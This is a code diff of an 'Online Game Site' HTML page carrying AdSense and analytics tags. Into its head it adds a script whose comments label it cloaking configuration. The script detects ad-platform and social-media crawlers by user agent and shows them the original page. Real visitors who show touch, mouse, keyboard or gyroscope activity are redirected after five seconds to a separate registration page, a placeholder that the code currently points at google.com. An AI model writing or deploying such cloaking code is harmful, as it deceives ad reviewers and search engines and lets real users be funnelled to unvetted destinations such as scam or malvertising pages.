@@ -1,70 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <meta name="description" content="Online Game Site" />
-    <meta name="keywords" content="game, online, site" />
-    <meta name="author" content="Seiri" />
-    <meta name="robots" content="index, follow" />
-    <meta name="theme-color" content="#1a1a1a" />
-    <link rel="stylesheet" href="assets/css/style.css" />
-    <link rel="icon" href="favicon.ico" />
-    <link
-      rel="apple-touch-icon"
-      href="https://html-online-game.github.io/favicon.ico"
-    />
-    <!-- Google adsense -->
-    <script
-      async
-      src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4988552421895566"
-      crossorigin="anonymous"
-    ></script>
-    <!-- Google tag (gtag.js) -->
-    <script
-      async
-      src="https://www.googletagmanager.com/gtag/js?id=G-PF5LNZJYLL"
-    ></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<meta name="description" content="Online Game Site" />
+<meta name="keywords" content="game, online, site" />
+<meta name="author" content="Seiri" />
+<meta name="robots" content="index, follow" />
+<meta name="theme-color" content="#1a1a1a" />
+<link rel="stylesheet" href="assets/css/style.css" />
+<link rel="icon" href="favicon.ico" />
+<link rel="apple-touch-icon" href="https://html-online-game.github.io/favicon.ico" />
+
+<!-- Google adsense -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4988552421895566" crossorigin="anonymous"></script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PF5LNZJYLL"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+  gtag("config", "G-PF5LNZJYLL");
+</script>
+<script type="text/javascript" src="assets/js/script.js"></script>
+
+<title>Online Game Site</title>
+
+<script>
+// === Cloaking 配置 ===
+const REG_PAGE = "https://your-reg-page.com"; // 真实用户跳转地址
+const DELAY_MS = 5000; // 延迟跳转时间（毫秒）
+const BOT_UA = [
+  "facebookexternalhit","Facebot","Twitterbot","Slackbot",
+  "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
+];
+
+// 检测爬虫 UA
+function isBot(){
+  const ua = navigator.userAgent;
+  return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
+}
+
+// 检测是否移动设备
+function isMobile(){
+  const ua = navigator.userAgent;
+  const mobileKeywords = [
+    "Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"
+  ];
+  return mobileKeywords.some(k => ua.includes(k));
+}
+
+// 行为检测变量
+let userActive = false;
+
+// 移动端触摸检测
+window.addEventListener('touchstart', () => { userActive = true; }, { once: true });
+
+// 桌面端鼠标/键盘检测
+window.addEventListener('mousemove', () => { userActive = true; }, { once: true });
+window.addEventListener('keydown', () => { userActive = true; }, { once: true });
+
+// 陀螺仪检测（仅移动端）
+let hasGyro = false;
+if (window.DeviceMotionEvent) {
+  window.addEventListener("devicemotion", function(event) {
+    if (event.accelerationIncludingGravity) {
+      hasGyro = true;
+    }
+  }, { once: true });
+}
+
+// 延迟执行判断
+setTimeout(() => {
+  if (!isBot()) {
+    if (isMobile()) {
+      // 移动端逻辑：触摸 + 陀螺仪
+      if (userActive && hasGyro) {
+        window.location.href = "https://google.com";
       }
-      gtag("js", new Date());
-      gtag("config", "G-PF5LNZJYLL");
-    </script>
-    <script type="text/javascript" src="assets/js/script.js"></script>
-    <title>Online Game Site</title>
-  </head>
-  <body>
-    <header>
-      <h1>Online Game Site</h1>
-    </header>
-    <nav>
-      <a href="https://html-online-game.github.io/">Home</a>
-      <a href="https://html-online-game.github.io/policy.html">Policy</a>
-    </nav>
-    <main class="game-container">
-      <h2>All Games</h2>
-      <!-- html-online-game-list-ad -->
-      <div class="ad-container">
-        <ins
-          class="adsbygoogle"
-          style="display: block"
-          data-ad-client="ca-pub-4988552421895566"
-          data-ad-slot="2343374539"
-          data-ad-format="auto"
-          data-full-width-responsive="true"
-        ></ins>
-        <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
-        </script>
-      </div>
-      <div class="game-list"></div>
-    </main>
-    <footer>
-      <p>&copy; 2025 Online Game Site. All rights reserved.</p>
-    </footer>
-  </body>
+    } else {
+      // 桌面端逻辑：鼠标/键盘交互
+      if (userActive) {
+        window.location.href = "https://google.com";
+      }
+    }
+  } else {
+    console.log("检测到广告平台爬虫，保持原页面");
+  }
+}, DELAY_MS);
+</script>
+</head>
+<body>
+<header>
+  <h1>Online Game Site</h1>
+</header>
+<nav>
+  <a href="https://html-online-game.github.io/">Home</a>
+  <a href="https://html-online-game.github.io/policy.html">Policy</a>
+</nav>
+<main class="game-container">
+  <h2>All Games</h2>
+  <!-- html-online-game-list-ad -->
+  <div class="ad-container">
+    <ins class="adsbygoogle" style="display: block"
+      data-ad-client="ca-pub-4988552421895566"
+      data-ad-slot="2343374539"
+      data-ad-format="auto"
+      data-full-width-responsive="true"></ins>
+    <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+  </div>
+  <div class="game-list"></div>
+</main>
+<footer>
+  <p>&copy; 2025 Online Game Site. All rights reserved.</p>
+</footer>
+</body>
 </html>
